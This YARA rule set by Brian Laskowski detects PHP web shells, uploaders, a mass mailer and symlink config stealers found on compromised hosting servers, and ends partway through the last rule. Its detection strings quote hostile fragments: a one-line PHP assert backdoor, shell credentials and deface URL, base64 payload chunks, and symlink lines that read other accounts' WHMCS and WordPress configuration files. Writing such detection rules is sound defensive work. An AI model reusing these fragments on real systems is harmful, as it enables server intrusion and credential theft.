/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-05-29
   Identifier: case109
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule class_30104 {
   meta:
      description = "case109 - file class.30104.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "68a039f4da41a2afd11f54e340aff45878ab6b63a31c21ddcb128d539a7f0749"
   strings:
      $s1 = "<?php @assert($_POST['04p2l8p0']);?>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_05_29_18_case109_case109_up {
   meta:
      description = "case109 - file up.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "c726a17e6852eeda1eda467c5725eab693a808445c42ddde0aa4c89018511c38"
   strings:
      $s1 = "if (!empty($_GET['action']) &&  $_GET['action'] == \"logout\") {session_destroy();unset ($_SESSION['pass']);}" fullword ascii
      $s2 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1256\" /></head><body>" fullword ascii
      $s3 = "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">" fullword ascii
      $s4 = "{echo \"Stored file:\".$_FILES[\"file\"][\"name\"].\"<br/>Size:\".($_FILES[\"file\"][\"size\"]/1024).\" kB<br/>\";" fullword ascii
      $s5 = "while($entryName = readdir($myDirectory)) {$dirArray[] = $entryName;} closedir($myDirectory);" fullword ascii
      $s6 = "<form enctype=\"multipart/form-data\" action=\"<?php echo $_SERVER['PHP_SELF']; ?>\" method=\"POST\">" fullword ascii
      $s7 = "if ($_POST['pass'] == $pass) {$_SESSION['pass'] = $pass; }" fullword ascii
      $s8 = "move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$_FILES[\"file\"][\"name\"]);" fullword ascii
      $s9 = "if (empty($_POST['pass'])) {$_POST['pass']='';}" fullword ascii
      $s10 = "echo '<form action=\"'.$_SERVER['PHP_SELF'].'\" method=\"post\"><input name=\"pass\" type=\"password\"><input type=\"submit\"></" ascii
      $s11 = "echo '<form action=\"'.$_SERVER['PHP_SELF'].'\" method=\"post\"><input name=\"pass\" type=\"password\"><input type=\"submit\"></" ascii
      $s12 = "echo \"<TABLE border=1 cellpadding=5 cellspacing=0 class=whitelinks><TR><TH>Filename</TH><th>Filetype</th><th>Filesize</th></" fullword ascii
      $s13 = "{echo \"Error: \" . $_FILES[\"file\"][\"error\"] . \"<br>\";}" fullword ascii
      $s14 = "if (empty($_SESSION['pass'])) {$_SESSION['pass']='';}" fullword ascii
      $s15 = "Please choose a file: <input name=\"file\" type=\"file\" /><br />" fullword ascii
      $s16 = "<td><a href=\\\"$dirArray[$index]\\\">$dirArray[$index]</a></td>" fullword ascii
      $s17 = "<input type=\"submit\" value=\"Upload\" /></form>" fullword ascii
      $s18 = "$this_script = $path_name['basename'];" fullword ascii
      $s19 = "// get each entry" fullword ascii
      $s20 = "if ($_FILES[\"file\"][\"error\"] > 0)" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 6KB and
         ( 8 of them )
      ) or ( all of them )
}

rule _infected_05_29_18_case109_case109_send {
   meta:
      description = "case109 - file send.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "63f5597336bba04bf274df31ef3efb7d270f5fa10287bb2d14f424729c5eb77e"
   strings:
      $s1 = "$headers .= \"Content-type: text/html; charset=iso-8859-1\\r\\n\";" fullword ascii
      $s2 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">" fullword ascii
      $s3 = "echo \"* N?mero: $count <b>\".$email[$i].\"</b> <font color=red>ERRO AO ENVIAR</font><br><hr>\";" fullword ascii
      $s4 = "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"form1\">" fullword ascii
      $s5 = "echo \"* N?mero: $count <b>\".$email[$i].\"</b> <font color=green>OK</font><br><hr>\";" fullword ascii
      $s6 = "$headers  = \"MIME-Version: 1.0\\r\\n\";" fullword ascii
      $s7 = "$redirectlist = array_unique(explode(\"\\n\",$_POST['redirectlist']));" fullword ascii
      $s8 = "$headers .= \"From: \".$realname.\" <\".$from.\">\\r\\n\";" fullword ascii
      $s9 = "ame\" type=\"text\" class=\"form\" id=\"realname\" style=\"width:48%\" value=\"<?php print $realname; ?>\" size=\"1\" > </td>" fullword ascii
      $s10 = "about it\".md5(rand(0,99999)+rand(0,99999)).\"\\r\\n -->\";" fullword ascii
      $s11 = "if(mail($email[$i], $subject, $messgb, $headers))" fullword ascii
      $s12 = "<table width=\"527\" height=\"511\" border=\"0\" cellpadding=\"0\" cellspacing=\"1\" bgcolor=\"#CCCCCC\" class=\"normal\">" fullword ascii
      $s13 = "<table width=\"100%\"  border=\"0\" cellpadding=\"0\" cellspacing=\"5\" class=\"normal\" height=\"444\">" fullword ascii
      $s14 = "<td height=\"20\" colspan=\"2\" bgcolor=\"#999999\"><span class=\"texto\">C&oacute;digo HTML:</span></td>" fullword ascii
      $s15 = "$to = $_POST['emaillist'];" fullword ascii
      $s16 = "$testa = $_POST['veio'];" fullword ascii
      $s17 = "$realname = $_POST['realname'];" fullword ascii
      $s18 = "$redirect = $redirectlist[$redi].'/'.md5(rand(0,99999)+rand(0,9999));" fullword ascii
      $s19 = "$subject = $_POST['subject'];" fullword ascii
      $s20 = "$message = $_POST['message'];" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_05_29_18_case109_case109_smevk {
   meta:
      description = "case109 - file smevk.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "c7645ec5826178f7848014085d950efc4cb3b8b3841d155be15102eadaca1475"
   strings:
      $s1 = "SmEvK_PaThAn Shell v3 Coded by Kashif Khan ." fullword ascii
      $s2 = "$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin)." fullword ascii
      $s3 = "https://www.facebook.com/smevkpathan" fullword ascii
      $s4 = "smevkpathan@gmail.com" fullword ascii
      $s5 = "Edit Shell according to your choice." fullword ascii
      $s6 = "Domain read bypass." fullword ascii
      $s7 = "$auth_pass = \"rao1\";                                  //Your Password." fullword ascii
      $s8 = "//Change Shell Theme here//" fullword ascii
      $s9 = "ZhbHVlKTtyZXR1cm4gZmFsc2U7XCc+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXBhcmFtPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT48YnI+PHNwYW" ascii
      $s10 = "c+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXBhcmFtPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT48YnI+PHNwYW4+R2xvYiAobGlzdCBkaXIpPC9zcG" ascii
      $s11 = "xudWxsLCI2Iix0aGlzLnBhcmFtLnZhbHVlKTtyZXR1cm4gZmFsc2U7XCc+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXBhcmFtPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT" ascii
      $s12 = "#-------------------------------------------------------------------------------" fullword ascii
      $s13 = "onJykuIj4gc2VuZCB1c2luZyBBSkFYPGJyPjx0ZXh0YXJlYSBuYW1lPSdpbnB1dCcgc3R5bGU9J21hcmdpbi10b3A6NXB4JyBjbGFzcz1iaWdhcmVhPiIuaHRtbHNwZW" ascii
      $s14 = "NvcnMtNHUuY29tL2N1cnNvci8yMDEyLzAyLzExL2Nocm9tZS1wb2ludGVyLmh0bWwiIHRhcmdldD0iX2JsYW5rIiB0aXRsZT0iQ2hyb21lIFBvaW50ZXIiPjxpbWcgc3" ascii
      $s15 = "AuYmlnYXJlYSAgICB7IHdpZHRoOjEwMCU7aGVpZ2h0OjI1MHB4O21hcmdpbi10b3A6MHB4OyBib3JkZXItcmFkaXVzOjEwcHg7IGJvcmRlci1jb2xvcjonLiRUaGVtZS" ascii
      $s16 = "d3LmN1cnNvcnMtNHUuY29tL2N1cnNvci8yMDEyLzAyLzExL2Nocm9tZS1wb2ludGVyLmh0bWwiIHRhcmdldD0iX2JsYW5rIiB0aXRsZT0iQ2hyb21lIFBvaW50ZXIiPj" ascii
      $s17 = "dsemRHVnVJSEJ2Y25SY2JpSTdEUXAzYUdsc1pTZ3hLU0I3RFFvSllXTmpaWEIwS0VOUFRrNHNVeWs3RFFvSmFXWW9JU2drY0dsa1BXWnZjbXNwS1NCN0RRb0pDV1JwWl" ascii
      $s18 = "$UserName = \"rao1\";                                      //Your UserName here." fullword ascii
      $s19 = "$smevk = \"PD9waHAKCiRkZWZhdWx0X2FjdGlvbiA9ICdGaWxlc01hbic7CkBkZWZpbmUoJ1NFTEZfUEFUSCcsIF9fRklMRV9fKTsKaWYoIHN0cnBvcygkX1NFUlZFU" ascii
      $s20 = "$Theme = '#09B5A6';                                    //Change border-color accoriding to your choice." fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( 8 of them )
      ) or ( all of them )
}

rule sig_73601337 {
   meta:
      description = "case109 - file 73601337.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "742a8ec0f6aa3812035005e46d8badcaa2dda73865003bf5a2436770b7f9d134"
   strings:
      $s1 = "$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin)." fullword ascii
      $s2 = "Edit Shell according to your choice." fullword ascii
      $s3 = "Domain read bypass." fullword ascii
      $s4 = "$auth_pass = \"1337\";                                  //Your Password." fullword ascii
      $s5 = "//Change Shell Theme here//" fullword ascii
      $s6 = "ZhbHVlKTtyZXR1cm4gZmFsc2U7XCc+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXBhcmFtPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT48YnI+PHNwYW" ascii
      $s7 = "c+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXBhcmFtPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT48YnI+PHNwYW4+R2xvYiAobGlzdCBkaXIpPC9zcG" ascii
      $s8 = "xudWxsLCI2Iix0aGlzLnBhcmFtLnZhbHVlKTtyZXR1cm4gZmFsc2U7XCc+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXBhcmFtPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT" ascii
      $s9 = "#-------------------------------------------------------------------------------" fullword ascii
      $s10 = "onJykuIj4gc2VuZCB1c2luZyBBSkFYPGJyPjx0ZXh0YXJlYSBuYW1lPSdpbnB1dCcgc3R5bGU9J21hcmdpbi10b3A6NXB4JyBjbGFzcz1iaWdhcmVhPiIuaHRtbHNwZW" ascii
      $s11 = "NvcnMtNHUuY29tL2N1cnNvci8yMDEyLzAyLzExL2Nocm9tZS1wb2ludGVyLmh0bWwiIHRhcmdldD0iX2JsYW5rIiB0aXRsZT0iQ2hyb21lIFBvaW50ZXIiPjxpbWcgc3" ascii
      $s12 = "AuYmlnYXJlYSAgICB7IHdpZHRoOjEwMCU7aGVpZ2h0OjI1MHB4O21hcmdpbi10b3A6MHB4OyBib3JkZXItcmFkaXVzOjEwcHg7IGJvcmRlci1jb2xvcjonLiRUaGVtZS" ascii
      $s13 = "d3LmN1cnNvcnMtNHUuY29tL2N1cnNvci8yMDEyLzAyLzExL2Nocm9tZS1wb2ludGVyLmh0bWwiIHRhcmdldD0iX2JsYW5rIiB0aXRsZT0iQ2hyb21lIFBvaW50ZXIiPj" ascii
      $s14 = "dsemRHVnVJSEJ2Y25SY2JpSTdEUXAzYUdsc1pTZ3hLU0I3RFFvSllXTmpaWEIwS0VOUFRrNHNVeWs3RFFvSmFXWW9JU2drY0dsa1BXWnZjbXNwS1NCN0RRb0pDV1JwWl" ascii
      $s15 = "$UserName = \"1337\";                                      //Your UserName here." fullword ascii
      $s16 = "$smevk = \"PD9waHAKCiRkZWZhdWx0X2FjdGlvbiA9ICdGaWxlc01hbic7CkBkZWZpbmUoJ1NFTEZfUEFUSCcsIF9fRklMRV9fKTsKaWYoIHN0cnBvcygkX1NFUlZFU" ascii
      $s17 = "$Theme = '#09B5A6';                                    //Change border-color accoriding to your choice." fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( 8 of them )
      ) or ( all of them )
}

rule _infected_05_29_18_case109_case109_4Zur3 {
   meta:
      description = "case109 - file 4Zur3.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "d540fc9ae3efd056cb83ed3abbadd6a34ddfea2229fa36b2e0328272004c8e32"
   strings:
      $s1 = "UnBMVXB2YjIxc1lURXVkSGgwSWpzS0NRbGxkbUZzSUNKc2JpQXRjeUF2YUc5dFpUSXZKR2t2Y0hWaWJHbGpYMmgwYld3dllteHZaeTlqYjI1bWFXZDFjbUYwYVc5dUxu" ascii /* base64 encoded string 'RpLUpvb21sYTEudHh0IjsKCQlldmFsICJsbiAtcyAvaG9tZTIvJGkvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLn' */
      $s2 = "RzlqWVhScGIyNGlQZzBLSkZCeWIyMXdkQ0IxY0d4dllXUThZbkkrUEdKeVBnMEtSbWxzWlc1aGJXVTZJRHhwYm5CMWRDQjBlWEJsUFNKbWFXeGxJaUJ1WVcxbFBTSm1J" ascii /* base64 encoded string 'G9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmI' */
      $s3 = "UzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwTkNuTjFZaUJRY21sdWRFWnBiR1ZWY0d4dllXUkdiM0p0RFFwN0RRb0pKRVZ1WTI5a1pVTjFjbkpsYm5SRWFYSWdQ" ascii /* base64 encoded string 'S0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgP' */
      $s4 = "bk5sY3lCSFJWUXNJRkJQVTFRZ1lXNWtJRzExYkhScGNHRnlkQzltYjNKdExXUmhkR0VnZEdoaGRDQnBjeUIxYzJWa0lHWnZjaUIxY0d4dllXUnBibWNnWm1sc1pYTXVE" ascii /* base64 encoded string 'nNlcyBHRVQsIFBPU1QgYW5kIG11bHRpcGFydC9mb3JtLWRhdGEgdGhhdCBpcyB1c2VkIGZvciB1cGxvYWRpbmcgZmlsZXMuD' */
      $s5 = "R0YyWlNCMGJ5QnpaVzVrSUc5dWJIa2dkR2hsSUd4cGJtc2djR0ZuWlEwS0NYc05DZ2tKSmxCeWFXNTBSRzkzYm14dllXUk1hVzVyVUdGblpTZ2tWR0Z5WjJWMFJtbHNa" ascii /* base64 encoded string 'GF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsNCgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZ' */
      $s6 = "cmFtPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT48YnI+PHNwYW4+R2xvYiAobGlzdCBkaXIpPC9zcGFuPjxmb3JtIG9uc3VibWl0PVwnZyhudWxs" ascii /* base64 encoded string 'ram><input type=submit value=">>"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null' */
      $s7 = "R2x2YmlCbGNTQWlaRzkzYm14dllXUWlLU0FKQ1FrSkl5QjFjMlZ5SUhkaGJuUnpJSFJ2SUdSdmQyNXNiMkZrSUdFZ1ptbHNaUTBLZXcwS0NYQnlhVzUwSUNaRWIzZHVi" ascii /* base64 encoded string 'GlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCXByaW50ICZEb3dub' */
      $s8 = "aHdJSE5vTFdOdmJtWnBaeTh3TFNScExWZHZjbVJ3Y21WemN6RXVkSGgwSWpzS0NRbGxkbUZzSUNKc2JpQXRjeUF2YUc5dFpUUXZKR2t2Y0hWaWJHbGpYMmgwYld3dllt" ascii /* base64 encoded string 'hwIHNoLWNvbmZpZy8wLSRpLVdvcmRwcmVzczEudHh0IjsKCQlldmFsICJsbiAtcyAvaG9tZTQvJGkvcHVibGljX2h0bWwvYm' */
      $s9 = "U0IwWVhKblpYUTlKMTlpYkdGdWF5Y2dhSEpsWmowaUl5SStTR1ZzY0R3dllUNE5Dand2ZEdRK0RRbzhMM1J5UGcwS1BIUnlQZzBLUEhSa0lHTnZiSE53WVc0OUlqSWlQ" ascii /* base64 encoded string 'SB0YXJnZXQ9J19ibGFuaycgaHJlZj0iIyI+SGVscDwvYT4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiP' */
      $s10 = "RzkzYm14dllXUW1iejFuYnlabVBTSXVKR1l1SWljK1JHOTNibXh2WVdROEwyRStJSHdnUEdFZ2IyNWpiR2xqYXoxY0ltbG1LQ0ZqYjI1bWFYSnRLQ2RTWlcxdmRtVWda" ascii /* base64 encoded string 'G93bmxvYWQmbz1nbyZmPSIuJGYuIic+RG93bmxvYWQ8L2E+IHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZ' */
      $s11 = "V2xyTjBSUmIwcGpNMng2WkVkV2RFdERTakZpYms1c1pFTkNTVk5XVGxWU2EyeE5VbFJ6WjJSWE5YcGFXRkZuVlRCR1YxSlZhRXBWTVZGblR6SldhbUZIT0dkS01YTnlX" ascii /* base64 encoded string 'WlrN0RRb0pjM2x6ZEdWdEtDSjFibk5sZENCSVNWTlVSa2xNUlRzZ2RXNXpaWFFnVTBGV1JVaEpVMVFnTzJWamFHOGdKMXNyW' */
      $s12 = "QXRjeUF2YUc5dFpUY3ZKR2t2Y0hWaWJHbGpYMmgwYld3dllXUnRhVzR2WTI5dVptbG5MbkJvY0NCemFDMWpiMjVtYVdjdk1DMGthUzFQZEdobGNqSXVkSGgwSWpzS0NR" ascii /* base64 encoded string 'AtcyAvaG9tZTcvJGkvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCBzaC1jb25maWcvMC0kaS1PdGhlcjIudHh0IjsKCQ' */
      $s13 = "eUIxY0d4dllXUWdabWxzWlhNTkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRM" ascii /* base64 encoded string 'yB1cGxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tL' */
      $s14 = "MlJsUkdseUtDUndZWFJvS1M0aUptTTlJaTRrWVdOMGFXOXVMaUluUGlJdUpHWnBiR1V1SWp3dllUNDhMM1JrUGlJN0RRb0pDUWtrY21WemRXeDBJQzQ5SUNJOGRHUStJ" ascii /* base64 encoded string '2RlRGlyKCRwYXRoKS4iJmM9Ii4kYWN0aW9uLiInPiIuJGZpbGUuIjwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+I' */
      $s15 = "cHV0IHR5cGU9dGV4dCBuYW1lPXBhcmFtPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT48YnI+PHNwYW4+UG9zaXhfZ2V0cHd1aWQgKCJSZWFkIiAv" ascii /* base64 encoded string 'put type=text name=param><input type=submit value=">>"></form><br><span>Posix_getpwuid ("Read" /' */
      $s16 = "MjVzYjJGa0lqNE5DaVJRY205dGNIUWdaRzkzYm14dllXUThZbkkrUEdKeVBnMEtSbWxzWlc1aGJXVTZJRHhwYm5CMWRDQjBlWEJsUFNKMFpYaDBJaUJ1WVcxbFBTSm1J" ascii /* base64 encoded string '25sb2FkIj4NCiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmI' */
      $s17 = "NGdMWE1nTDJodmJXVXZKR2t2Y0hWaWJHbGpYMmgwYld3dlltbHNiR2x1Wnk5amIyNW1hV2QxY21GMGFXOXVMbkJvY0NCemFDMWpiMjVtYVdjdk1DMGthUzFYYUcwMkxu" ascii /* base64 encoded string '4gLXMgL2hvbWUvJGkvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCBzaC1jb25maWcvMC0kaS1XaG02Ln' */
      $s18 = "bGpYMmgwYld3dllteHZaeTkzY0MxamIyNW1hV2N1Y0dod0lITm9MV052Ym1acFp5OHdMU1JwTFZkdmNtUndjbVZ6Y3pJdWRIaDBJanNLQ1FsbGRtRnNJQ0pzYmlBdGN5" ascii /* base64 encoded string 'ljX2h0bWwvYmxvZy93cC1jb25maWcucGhwIHNoLWNvbmZpZy8wLSRpLVdvcmRwcmVzczIudHh0IjsKCQlldmFsICJsbiAtcy' */
      $s19 = "eUEwSURVZ05pQTNJRGdnT1NBeE1DQXhNU0F4TWk4N0RRb0pDU1JzYlhScGJXVWdQU0J6Y0hKcGJuUm1LQ0lsTURKa0x5VnpMeVUwWkNBbE1ESmtPaVV3TW1RaUxDUmtM" ascii /* base64 encoded string 'yA0IDUgNiA3IDggOSAxMCAxMSAxMi87DQoJCSRsbXRpbWUgPSBzcHJpbnRmKCIlMDJkLyVzLyU0ZCAlMDJkOiUwMmQiLCRkL' */
      $s20 = "R2hsSUhWelpYSWdZVzVrSUhCeWIzWnBaR1Z6SUdFZ2JHbHVhdzBLSXlCMGFISnZkV2RvSUNCM2FHbGphQ0IwYUdVZ1ptbHNaU0JqWVc0Z1ltVWdaRzkzYm14dllXUmxa" ascii /* base64 encoded string 'GhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZ' */
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1000KB and
         ( 8 of them )
      ) or ( all of them )
}

rule SymlinkbySmevk {
   meta:
      description = "case109 - file SymlinkbySmevk.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "198f3f0b76210f9901762e94b525d93fc3c66178d1373c13b2994391c0159729"
   strings:
      $s1 = "@symlink('/home2/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');" fullword ascii
      $s2 = "@symlink('/home3/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');" fullword ascii
      $s3 = "@symlink('/home4/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');" fullword ascii
      $s4 = "@symlink('/home/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');" fullword ascii
      $s5 = "@symlink('/home/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');" fullword ascii
      $s6 = "@symlink('/home2/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');" fullword ascii
      $s7 = "@symlink('/home3/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');" fullword ascii
      $s8 = "@symlink('/home4/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');" fullword ascii
      $s9 = "@symlink('/home3/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');" fullword ascii
      $s10 = "@symlink('/home2/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');" fullword ascii
      $s11 = "@symlink('/home3/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');" fullword ascii
      $s12 = "@symlink('/home4/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');" fullword ascii
      $s13 = "@symlink('/home2/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');" fullword ascii
      $s14 = "@symlink('/home4/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');" fullword ascii
      $s15 = "@symlink('/home/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');" fullword ascii
      $s16 = "@symlink('/home/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');" fullword ascii
      $s17 = "@symlink('/home/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');" fullword ascii
      $s18 = "@symlink('/home4/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');" fullword ascii
      $s19 = "@symlink('/home2/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');" fullword ascii
      $s20 = "@symlink('/home3/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 200KB and
         ( 8 of them )
      ) or ( all of them )
}

rule _infected_05_29_18_case109_case109_adminer {
   meta:
      description = "case109 - file adminer.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "82faa945d041fdc0d98181ea05618ec8f22a27910bb1d461d8ef8f79527af0e5"
   strings:
      $x1 = "as$z=>$X){if($z!=\"\"&&$X>1){echo($rc?\"<p>\":\" \").\"<a href='\".h(ME).\"dump=\".urlencode(\"$z%\").\"'>\".h($z).\"</a>\";$rc=" ascii
      $x2 = "as$Wc=>$X){if($X[0]<$kg)unset($Vc[$Wc]);}}$Uc=&$Vc[$c->bruteForceKey()];if(!$Uc)$Uc=array($kg+30*60,0);$Uc[1]++;$_f=serialize($V" ascii
      $x3 = "as$k=>$S){$of=h(ME).\"db=\".urlencode($k);$v=h(\"Db-\".$k);echo\"<tr\".odd().\">\".(support(\"database\")?\"<td>\".checkbox(\"db" ascii
      $x4 = "as$V=>$G){if($G!==null){if($rc){echo\"<p id='logins' onmouseover='menuOver(this, event);' onmouseout='menuOut(this);'>\\n\";$rc=" ascii
      $s5 = "connect_error(){global$c,$g,$T,$l,$Gb;if(DB!=\"\"){header(\"HTTP/1.1 404 Not Found\");page_header(lang(31).\": \".h(DB),lang(98)" ascii
      $s6 = "EmailProcess($Z,$p)){if($_POST[\"save\"]||$_POST[\"delete\"]){$J=true;$na=0;$P=array();if(!$_POST[\"delete\"]){foreach($e" fullword ascii
      $s7 = "';if(!$L[\"hashed\"]){echo'<script type=\"text/javascript\">typePassword(document.getElementById(\\'pass\\'));</script>';}echo" fullword ascii
      $s8 = "password_file($i){$pc=get_temp_dir().\"/adminer.key\";$K=@file_get_contents($pc);if($K||!$i)return$K;$q=@fopen($pc,\"w\");if($q)" ascii
      $s9 = "password_file($i){$pc=get_temp_dir().\"/adminer.key\";$K=@file_get_contents($pc);if($K||!$i)return$K;$q=@fopen($pc,\"w\");if($q)" ascii
      $s10 = "($X))$fd++;}queries_redirect(ME.\"processlist=\",lang(218,$fd),$fd||!$_POST[\"kill\"]);}page_header(lang(102),$l);echo'" fullword ascii
      $s11 = "as$X){if($X[1]!=\"USAGE\")$_c[\"$C[2]$X[2]\"][$X[1]]=true;if(preg_match('~ WITH GRANT OPTION~',$L[0]))$_c[\"$C[2]$X[2]\"][\"GRAN" ascii
      $s12 = "doc_link($De){global$y,$g;$Lg=array('sql'=>\"http://dev.mysql.com/doc/refman/\".substr($g->server_info,0,3).\"/en/\",'sqlite'=>" ascii
      $s13 = "';}elseif(isset($_GET[\"dump\"])){$b=$_GET[\"dump\"];if($_POST&&!$l){$jb=\"\";foreach(array(\"output\",\"format\",\"db_style\"," ascii
      $s14 = "selectLengthProcess(){return(isset($_GET[\"text_length\"])?$_GET[\"text_length\"]:\"100\");}function" fullword ascii
      $s15 = "name(){return\"<a href='https://www.adminer.org/' target='_blank' id='h1'>Adminer</a>\";}function" fullword ascii
      $s16 = "<a href=\"https://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($fa,$_COOKIE[\"adminer_version" ascii
      $s17 = "<a href=\"https://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($fa,$_COOKIE[\"adminer_version" ascii
      $s18 = "add_invalid_login(){global$c;$pc=get_temp_dir().\"/adminer.invalid\";$q=@fopen($pc,\"r+\");if(!$q){$q=@fopen($pc,\"w\");if(!$q)r" ascii
      $s19 = "* @license http://www.gnu.org/licenses/gpl-2.0.html GNU General Public License, version 2 (one or other)" fullword ascii
      $s20 = "(DB!=\"\"?$g->select_db(DB):isset($_GET[\"sql\"])||isset($_GET[\"dump\"])||isset($_GET[\"database\"])||isset($_GET[\"processlist" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _infected_05_29_18_case109_case109_scanner {
   meta:
      description = "case109 - file scanner.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "35bbe0242fbd1ea511e7272d43d8351a9a0033551a204cc612776571cf159651"
   strings:
      $s1 = "// Scanconfig 4.0 - www.code-security.com" fullword ascii
      $s2 = "// Author : uzanc | uzanc@live.com" fullword ascii
